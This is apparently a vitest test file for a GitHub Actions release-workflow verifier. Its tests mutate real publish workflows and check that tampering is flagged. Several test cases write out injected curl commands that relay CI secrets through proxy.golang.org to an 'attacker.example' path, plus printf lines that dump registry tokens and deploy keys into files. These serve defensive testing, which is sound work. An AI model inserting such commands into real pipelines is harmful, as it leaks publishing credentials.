// SPDX-License-Identifier: MIT

// The reviewers' cases against the REAL workflows (#794 review, rounds 4–5):
// each mutates a copy of sdk-publish.yml or cli-release.yml the way an
// attacker or a mistake would, and the real verifier, with the real settings,
// manifest and per-environment command table, must report a new finding.

import { cpSync, mkdtempSync, readdirSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { parse as parseYaml } from "yaml";
import { describe, expect, it } from "vitest";
import {
  ENVIRONMENT_COMMANDS,
  MANIFEST,
  SETTINGS,
  WORKFLOWS,
  findings,
  publicGateFindings,
  referenceFindings,
  releaseGateFindings,
  verifyWorkflows,
} from "./verify-workflows.mjs";
import { lexStrict } from "./strict-shell.mjs";

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
const settings = JSON.parse(readFileSync(join(ROOT, SETTINGS), "utf8"));
const manifest = JSON.parse(readFileSync(join(ROOT, MANIFEST), "utf8"));
const BASE = {};
for (const f of readdirSync(join(ROOT, WORKFLOWS)).filter((n) => /\.ya?ml$/.test(n)))
  BASE[f] = parseYaml(readFileSync(join(ROOT, WORKFLOWS, f), "utf8"));
const P = "sdk-publish.yml";
const C = "cli-release.yml";

const all = (w) =>
  [
    ...findings({ settings, manifest, workflows: w }),
    ...publicGateFindings(w),
    ...releaseGateFindings(w),
    ...referenceFindings(w),
  ].map((f) => `${f.file}: ${f.job}: ${f.why}`);
/** The findings `mutate` adds to the real tree, which itself has none. */
function added(mutate) {
  const w = structuredClone(BASE);
  mutate(w);
  return all(w);
}
const inject = (w, file, job, s) =>
  w[file].jobs[job].steps.splice(1, 0, { name: "injected", ...s });
/** Append `line` to the run block of the step whose env names `needle`. */
const append = (w, file, job, needle, line) => {
  const s = w[file].jobs[job].steps.find(
    (x) => typeof x.run === "string" && x.env && needle in x.env,
  );
  if (s === undefined) throw new Error(`no step of ${job} with ${needle} in its env`);
  s.run = `${s.run}\n${line}\n`;
};

describe("the real release workflows", () => {
  it("have no finding", () => expect(all(BASE)).toEqual([]));
});

describe("a credential leaves no job through curl or a file (round 5, HIGH)", () => {
  const RELAY = (name) =>
    `curl -fsS --proto =https --tlsv1.2 "https://proxy.golang.org/attacker.example/\${${name}}/@v/list"`;
  it.each([
    [
      "H1 maven: a proxy relay of MAVEN_R2_SECRET_ACCESS_KEY",
      (w) =>
        append(
          w,
          P,
          "publish-maven",
          "MAVEN_R2_SECRET_ACCESS_KEY",
          RELAY("MAVEN_R2_SECRET_ACCESS_KEY"),
        ),
      /curl is not a command environment sdk-publish-maven's job runs|credential/,
    ],
    [
      "H2 cli upload: a proxy relay of R2_SECRET_ACCESS_KEY",
      (w) => append(w, C, "upload", "R2_SECRET_ACCESS_KEY", RELAY("R2_SECRET_ACCESS_KEY")),
      /credential R2_SECRET_ACCESS_KEY outside its recorded position/,
    ],
    [
      "H3 cli promote: a proxy relay of two keys",
      (w) =>
        append(
          w,
          C,
          "promote",
          "R2_SECRET_ACCESS_KEY",
          'curl -fsS "https://proxy.golang.org/attacker.example/${R2_ACCESS_KEY_ID}/${R2_SECRET_ACCESS_KEY}/@v/list"',
        ),
      /credential R2_ACCESS_KEY_ID outside/,
    ],
    [
      "H5 maven: the secret printed into publish-tmp",
      (w) =>
        append(
          w,
          P,
          "publish-maven",
          "MAVEN_R2_SECRET_ACCESS_KEY",
          "printf '%s\\n' \"${MAVEN_R2_SECRET_ACCESS_KEY}\" > publish-tmp/k",
        ),
      /credential MAVEN_R2_SECRET_ACCESS_KEY outside/,
    ],
    [
      "N1 crates: the OIDC token printed into publish-tmp",
      (w) => {
        const s = w[P].jobs["publish-crates"].steps.find((x) => x.name === "Upload");
        s.run = "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/leak\n" + s.run;
      },
      /credential CARGO_REGISTRY_TOKEN outside/,
    ],
    [
      "go: a relay of the deploy key, though curl is the Go job's",
      (w) =>
        append(
          w,
          P,
          "publish-go",
          "DEPLOY_KEY",
          'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/${DEPLOY_KEY}"',
        ),
      /credential DEPLOY_KEY outside/,
    ],
    [
      "go: an expansion before /@v/",
      (w) =>
        inject(w, P, "publish-go", {
          run: 'curl -fsS "https://proxy.golang.org/${UNIT_VERSION}/x/@v/list"',
        }),
      /literal up to \/@v\//,
    ],
    [
      "go: another module on the proxy",
      (w) =>
        inject(w, P, "publish-go", {
          run: 'curl -fsS "https://proxy.golang.org/attacker.example/x/@v/list"',
        }),
      /literal up to \/@v\//,
    ],
    [
      "npm: curl outside the Go job",
      (w) =>
        inject(w, P, "publish-npm", {
          run: 'curl -fsS "https://proxy.golang.org/github.com/confeature/sdks/apps/sdk-go/@v/list"',
        }),
      /curl is not a command environment sdk-publish-npm's job runs/,
    ],
    [
      "npm: git outside the git jobs",
      (w) =>
        inject(w, P, "publish-npm", {
          run: "git push git@github.com:confeature/sdks.git HEAD:refs/heads/x",
        }),
      /git is not a command environment sdk-publish-npm's job runs/,
    ],
    [
      "nuget: a credential that is not a deploy key, written as one",
      (w) =>
        append(
          w,
          P,
          "publish-nuget",
          "NUGET_API_KEY",
          "printf '%s\\n' \"$NUGET_API_KEY\" > publish-tmp/ssh/key",
        ),
      /credential NUGET_API_KEY outside/,
    ],
    [
      "packagist: the deploy key written anywhere but its file",
      (w) =>
        append(
          w,
          P,
          "publish-packagist",
          "DEPLOY_KEY",
          "printf '%s\\n' \"$DEPLOY_KEY\" > publish-tmp/copy",
        ),
      /credential DEPLOY_KEY outside/,
    ],
    [
      "a credential through env.: a step env that copies one",
      (w) => {
        const s = w[P].jobs["publish-nuget"].steps.find((x) => x.name === "Upload");
        s.env = { ...s.env, COPY: "${{ env.NUGET_API_KEY }}" };
        s.run += "\nprintf '%s\\n' \"$COPY\"\n";
      },
      /credential COPY outside/,
    ],
  ])("%s", (_, mutate, why) => {
    const got = added(mutate);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("ENVIRONMENT_COMMANDS lists exactly what each job runs", () => {
  it("every listed command is used by its environment's real job (an unused allowance is a hole)", () => {
    const used = new Map();
    for (const f of [P, C])
      for (const job of Object.values(BASE[f].jobs)) {
        const env = typeof job.environment === "string" ? job.environment : job.environment?.name;
        if (env === undefined) continue;
        if (!used.has(env)) used.set(env, new Set());
        for (const s of job.steps ?? [])
          if (typeof s.run === "string")
            for (const c of lexStrict(s.run).commands) {
              const w = c.words.find((x) => !["if", "then", "else", "fi"].includes(x.raw));
              if (w !== undefined) used.get(env).add(w.text);
            }
      }
    for (const [env, cmds] of Object.entries(ENVIRONMENT_COMMANDS))
      expect(
        cmds.filter((c) => !used.get(env)?.has(c)),
        env,
      ).toEqual([]);
    expect([...used.keys()].filter((e) => !(e in ENVIRONMENT_COMMANDS))).toEqual([]);
  });
});

describe("16 every expression reference names something (round 5)", () => {
  const job = (w, id) => w[P].jobs[id];
  it.each([
    [
      "a renamed setup output (the UNIT_PATH bug's other door)",
      (w) => {
        const o = job(w, "setup").outputs;
        o.unitPath = o.path;
        delete o.path;
      },
      /needs\.setup\.outputs\.path: job setup has no output path/,
    ],
    [
      "a need the job does not declare",
      (w) => {
        job(w, "publish-crates").env.UNIT_PATH = "${{ needs.pack-npm.outputs.file }}";
      },
      /publish-crates does not need pack-npm/,
    ],
    [
      "a step output of a later step",
      (w) => {
        const s = job(w, "publish-crates").steps;
        s[0].with = { ...s[0].with, x: "${{ steps.auth.outputs.token }}" };
      },
      /no earlier step of publish-crates has id auth/,
    ],
    [
      "an env name nothing defines",
      (w) => {
        job(w, "pack-npm").steps.find((s) => s.uses?.startsWith("actions/setup-node")).with[
          "node-version"
        ] = "${{ env.NODE_VER }}";
      },
      /no env: in scope defines NODE_VER/,
    ],
    [
      "an input the workflow does not declare",
      (w) => {
        job(w, "setup").steps.find((s) => s.id === "resolve").env.UNIT = "${{ inputs.unitName }}";
      },
      /declares no input unitName/,
    ],
    [
      "a job if: on an undeclared need",
      (w) => {
        job(w, "publish-npm").if = "needs.pack-pypi.result == 'success'";
      },
      /publish-npm does not need pack-pypi/,
    ],
    [
      "cli-release: an output the release job does not declare",
      (w) => {
        w[C].jobs.upload.steps.find((s) => s.env?.EXPECTED).env.EXPECTED =
          "${{ needs.release.outputs.digest }}";
      },
      /job release has no output digest/,
    ],
  ])("refuses %s", (_, mutate, why) => {
    const got = added(mutate);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});

describe("the gate itself runs rule 16", () => {
  it("verifyWorkflows reports a renamed setup output in a copy of the repository", () => {
    const dir = mkdtempSync(join(tmpdir(), "release-workflows-"));
    try {
      for (const rel of [SETTINGS, MANIFEST, WORKFLOWS])
        cpSync(join(ROOT, rel), join(dir, rel), { recursive: true });
      const f = join(dir, WORKFLOWS, P);
      writeFileSync(
        f,
        readFileSync(f, "utf8").replace(
          "      path: ${{ steps.resolve.outputs.path }}",
          "      unitPath: ${{ steps.resolve.outputs.path }}",
        ),
      );
      expect(verifyWorkflows(dir).map((x) => x.why)).toContainEqual(
        expect.stringMatching(/needs\.setup\.outputs\.path: job setup has no output path/),
      );
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("the values an exception trusts are pinned (round 5, MED)", () => {
  const stepWith = (w, file, job, pred) => w[file].jobs[job].steps.find(pred);
  it.each([
    [
      "N2 a step-level UNIT_PATH on the cargo step",
      (w) => {
        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
        s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
      },
      /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
    ],
    [
      "N2b a literal job-level UNIT_PATH",
      (w) => {
        w[P].jobs["publish-crates"].env.UNIT_PATH = "publish-tmp/evil";
      },
      /UNIT_PATH is publish-tmp\/evil, not its pinned expression/,
    ],
    [
      "H4 UNIT_PATH to publish-tmp plus the token in a forged crate",
      (w) => {
        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
        s.env = { ...s.env, UNIT_PATH: "publish-tmp/evil" };
        s.run =
          "printf '%s\\n' \"${CARGO_REGISTRY_TOKEN}\" > publish-tmp/evil/src/lib.rs\n" + s.run;
      },
      /not its pinned expression|credential CARGO_REGISTRY_TOKEN/,
    ],
    [
      "T1 cli upload: a step-level TAG",
      (w) => {
        const s = stepWith(
          w,
          C,
          "upload",
          (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
        );
        s.env = { ...s.env, TAG: "cli-v0.0.1" };
      },
      /TAG is cli-v0\.0\.1, not its pinned expression/,
    ],
    [
      "T2 cli upload: a job-level TAG",
      (w) => {
        w[C].jobs.upload.env = { ...(w[C].jobs.upload.env ?? {}), TAG: "cli-v0.0.1" };
      },
      /TAG is cli-v0\.0\.1, not its pinned expression/,
    ],
    [
      "N10 a TAG from the event's commit message",
      (w) => {
        const s = stepWith(
          w,
          C,
          "upload",
          (x) => typeof x.run === "string" && x.run.includes("publish-r2"),
        );
        s.env = { ...s.env, TAG: "${{ github.event.head_commit.message }}" };
      },
      /TAG is \$\{\{ github\.event\.head_commit\.message \}\}, not its pinned expression/,
    ],
    [
      "a step that redefines its job's value with the same expression",
      (w) => {
        const s = stepWith(w, P, "publish-crates", (x) => x.name === "Upload");
        s.env = { ...s.env, UNIT_PATH: "${{ needs.setup.outputs.path }}" };
      },
      /redefines the job's UNIT_PATH/,
    ],
    [
      "an artifact name from another output",
      (w) => {
        w[P].jobs["publish-npm"].env.ARTIFACT = "${{ needs.pack-npm.outputs.sha256 }}";
      },
      /ARTIFACT is .*, not its pinned expression/,
    ],
  ])("refuses %s", (_, mutate, why) => {
    const got = added(mutate);
    expect(
      got.some((g) => why.test(g)),
      got.join("\n"),
    ).toBe(true);
  });
});
